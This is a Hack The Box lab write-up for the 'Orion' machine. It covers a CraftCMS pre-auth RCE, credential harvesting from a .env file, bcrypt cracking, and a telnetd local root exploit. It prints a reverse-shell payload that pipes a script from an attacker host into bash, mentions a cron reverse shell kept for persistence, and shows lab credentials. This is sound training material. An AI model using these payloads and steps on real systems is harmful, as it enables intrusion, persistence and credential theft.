# Orion

**Platform:** Hack The Box | **OS:** Linux (Ubuntu 22.04) | **IP:** 10.129.125.18 | **Difficulty:** Easy
***

> Orion runs CraftCMS on nginx/Ubuntu. The foothold is a pre-auth RCE (CVE-2025-32432) through session poisoning and a deserialization gadget. From there you find MySQL creds in a .env file, crack a bcrypt hash for lateral movement, and escalate to root via a vulnerable telnetd service listening on localhost (CVE-2026-24061).

---

## Reconnaissance

Started with an nmap scan for active recon.

```bash
nmap -sC -sV -oN orion.nmap 10.129.125.18
```

The scan revealed ports 22 (SSH) and 80 (HTTP) open. Pretty standard for easy HTB boxes.
Nmap picked up the domain, so I added it to `/etc/hosts` to access the site.

```bash
echo '10.129.125.18 orion.htb' | sudo tee -a /etc/hosts
```

The website was a corporate landing page for a telecom company. Nothing interesting on the surface or in the source code, so I moved on to directory fuzzing.

---

## Directory Fuzzing

I used ffuf with the dirb common wordlist to enumerate directories.
Nothing came back with a 200, but `/admin` returned a 307 redirect. Following it led me to `/admin/login` the CraftCMS login panel. Right at the bottom of the form, the CMS version was exposed. Searched for CVEs against that version and got a hit.

### Technology Fingerprinting

```bash
whatweb http://orion.htb
```

```text
http://orion.htb [200 OK] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], PoweredBy[CraftCMS], X-Powered-By[Craft CMS]
```

This confirmed CraftCMS running behind nginx on Ubuntu. Combined with the version from the login page, I searched for known vulnerabilities and found CVE-2025-32432 — a pre-authentication RCE affecting this exact version.

---

## Foothold — CVE-2025-32432

CVE-2025-32432 is a pre-auth RCE affecting CraftCMS ≤ 3.9.14, ≤ 4.14.14, and ≤ 5.6.16. The attack works in two steps: first, you poison the PHP session file on disk by injecting PHP code through a query parameter that gets written unsanitized into the session. Then, you trigger a deserialization gadget (FieldLayoutBehavior → PhpManager) via the `assets/generate-transform` endpoint, which forces the server to include and execute the poisoned session file.

### Confirming the Vulnerability

Used Sachinart's checker script first to confirm the target was exploitable. It triggers `phpinfo()` via the FnStream gadget — a quick, low-impact way to verify without actually executing commands.

```bash
python3 craftcms_rce.py -u http://orion.htb
```

```text
[+] VULNERABLE: http://orion.htb
    CRAFT_DB_DATABASE: orion
    HOME Directory: /var/www
```

### Exploitation

I tried a couple of PoCs before landing on one that actually worked. The ExploitDB script (52525) had multiple bugs — wrong cookie name, broken URL paths, missing CSRF, and session handling issues. Another one from CTY-Research had a hardcoded session ID placeholder and a Python logic bug that always returned assetId 0. After wasting too much time patching broken code, I switched to P34NUT2's exploit which worked out of the box. The key difference: it dynamically discovers the session storage path via `phpinfo()` instead of assuming `/tmp`.

```bash
python3 craftcms_rce_exploit_php.py -u http://orion.htb -a 11 -c "whoami"
```

```text
[+] Found session path: /var/lib/php/sessions
[+] Session poisoning request sent successfully
[*********************************] Server response
www-data
```

### Reverse Shell

Direct bash reverse shells didn't work because the PHP exec runs through `sh`, not `bash` — so `/dev/tcp` wasn't available. Base64 encoding the payload didn't help either. What worked was the curl method: host a reverse shell script on my machine and pipe it to bash on the target.

```bash
# Kali — crear payload
echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > rev.sh
python3 -m http.server 8080

# Kali — listener
nc -lvnp 4444
python3 craftcms_rce_exploit_php.py -u http://orion.htb -a 11 -c "curl http://TU_IP:8080/rev.sh|bash"
```

### Shell Stabilization

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

Set up a cron job with a second reverse shell on a different port as persistence, just in case the initial shell died.

---

## Post-Exploitation

### Enumeration as www-data

Ran basic enumeration checked running services, open ports, SUID binaries, and looked for config files with credentials.

```bash
ss -tlnp
```

```text
LISTEN  0.0.0.0:22
LISTEN  0.0.0.0:80
LISTEN  127.0.0.1:23
LISTEN  127.0.0.1:3306
```

Two things stood out immediately: MariaDB on port 3306 (local only — probably has creds somewhere in the web app config), and port 23 (telnet) listening only on localhost, which is unusual and suspicious.

### Database Credentials

```bash
cat /var/www/html/craft/.env
```

```text
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Root creds for MySQL sitting right there in plaintext. Logged in and went straight for the users table.

```bash
mysql -u root -p'SuperSecureCraft123Pass!' orion
SELECT username, email, password FROM users;
```

```text
+----------+----------------+--------------------------------------------------------------+
| username | email          | password                                                     |
+----------+----------------+--------------------------------------------------------------+
| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----------+----------------+--------------------------------------------------------------+
```

### Cracking the Hash

The hash is bcrypt (`$2y$13$`). Tried hashcat first but my Kali VM has no GPU, so I switched to john with rockyou. Bcrypt is slow by design but HTB passwords tend to be in the first chunk of rockyou.

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Result: `darkangel]`

### Lateral Movement to adam

Tried reusing the MySQL password (`SuperSecureCraft123Pass!`) on the CraftCMS admin panel — didn't work. Tried it on SSH as `adam` nothing either. Then tried the cracked password on SSH and got in.

```bash
ssh adam@orion.htb
# password: darkangel
```

User flag obtained.

---

## Privilege Escalation — CVE-2026-24061

### Initial Enumeration as adam

Ran the usual privesc checklist sudo permissions, SUID binaries, cron jobs, interesting files in home.

```bash
sudo -l
# Sorry, user adam may not run sudo on orion.

find / -perm -4000 -type f 2>/dev/null
```

No sudo. SUID scan showed `rcp` and `rlogin` which are unusual on a modern system, but those ended up being a rabbit hole `rlogin` to localhost gave connection refused (port 513 closed).

### Finding the Vector

Went back to that suspicious port 23 from earlier. Checked the telnet version installed on the system.

```bash
telnet -V
```

```text
telnet (GNU inetutils) 2.7
```

GNU inetutils 2.7 is vulnerable to CVE-2026-24061 — a local privilege escalation. The exploit abuses the `CREDENTIALS_DIRECTORY` environment variable to bypass telnetd's authentication. Since telnetd runs as root and the service is listening on localhost, you can connect locally and get a root shell without any password.

### Exploitation

Found a Python PoC on GitHub. The first one I tried didn't work properly  it set the environment variable on the client side but didn't transmit it to the server correctly. Switched to a different PoC that handled the injection right.

```bash
python3 exploit.py 127.0.0.1
```

Connected to the local telnetd, bypassed authentication completely, and dropped into a root shell.
Root flag obtained. `whoami`, `id`

---

## Takeaways

Most of my time went into fighting broken exploit code. Three PoCs with different bugs each  wrong cookie names, hardcoded placeholders, broken Python logic. The biggest lesson: if a PoC has more than two bugs in the first five minutes, drop it and find another one. Don't patch someone else's broken code for an hour.
Also learned to always check the shell type before sending a reverse shell. Wasted attempts using `/dev/tcp` with `sh` when it only works in `bash`. Next time: curl + hosted script from the start, skip the inline payloads.
On the privesc side, I initially went down the rcp/rlogin rabbit hole because of the SUID bits. Should have investigated the weird localhost telnet service first — that was the real vector and it was staring at me the whole time.

---

## Tools Used

- nmap
- ffuf
- whatweb
- curl
- Python3
- john
- mysql
- netcat
- telnet

## References

- CVE-2025-32432 — CraftCMS Pre-Auth RCE
- P34NUT2 PoC (RCE funcional)
- Sachinart PoC (checker)
- CVE-2026-24061 — GNU inetutils telnetd privilege escalation
- ExploitDB — Craft CMS 5.6.16 RCE (52525)
